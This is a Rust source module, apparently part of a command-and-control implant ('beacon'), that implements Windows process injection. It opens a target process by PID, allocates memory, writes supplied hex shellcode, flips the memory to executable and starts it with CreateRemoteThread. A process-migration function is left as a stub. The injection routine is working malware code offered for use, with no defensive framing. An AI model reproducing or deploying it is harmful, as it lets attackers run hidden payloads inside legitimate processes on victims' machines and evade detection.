//! Process injection — multiple techniques, dispatch via config.

use anyhow::Result;

pub async fn inject_shellcode(args: &[String]) -> Result<String> {
    // args[0] = target PID, args[1] = hex shellcode
    if args.len() < 2 {
        return Err(anyhow::anyhow!("usage: inject <pid> <hex_shellcode>"));
    }
    let pid: u32 = args[0].parse()?;
    let sc = hex::decode(&args[1])?;

    #[cfg(target_os = "windows")]
    return inject_windows(pid, &sc).await;
    #[cfg(not(target_os = "windows"))]
    Ok(format!("inject stub: pid={pid} len={}", sc.len()))
}

#[cfg(target_os = "windows")]
async fn inject_windows(pid: u32, sc: &[u8]) -> Result<String> {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        System::{
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx, VirtualProtectEx},
            Threading::{
                CreateRemoteThread, OpenProcess,
                PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
            },
        },
    };
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;

    unsafe {
        let handle = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
            0, pid,
        );
        if handle == 0 {
            return Err(anyhow::anyhow!("OpenProcess failed"));
        }

        let remote = VirtualAllocEx(
            handle, std::ptr::null(), sc.len(),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        );
        if remote.is_null() {
            CloseHandle(handle);
            return Err(anyhow::anyhow!("VirtualAllocEx failed"));
        }

        let mut written = 0;
        WriteProcessMemory(handle, remote, sc.as_ptr() as _, sc.len(), &mut written);

        let mut old = 0u32;
        VirtualProtectEx(handle, remote, sc.len(),
                         windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ, &mut old);

        let thread = CreateRemoteThread(handle, std::ptr::null(), 0,
            Some(std::mem::transmute(remote)), std::ptr::null(), 0, std::ptr::null_mut());
        if thread == 0 {
            CloseHandle(handle);
            return Err(anyhow::anyhow!("CreateRemoteThread failed"));
        }

        CloseHandle(thread);
        CloseHandle(handle);
        Ok(format!("[+] Injected {} bytes into PID {pid}", sc.len()))
    }
}

pub async fn migrate(args: &[String]) -> Result<String> {
    // Migrate beacon to another process
    if args.is_empty() {
        return Err(anyhow::anyhow!("usage: migrate <pid>"));
    }
    let _pid: u32 = args[0].parse()?;
    // Inject self into target, then exit current process
    Ok(format!("migrate stub: pid={}", args[0]))
}
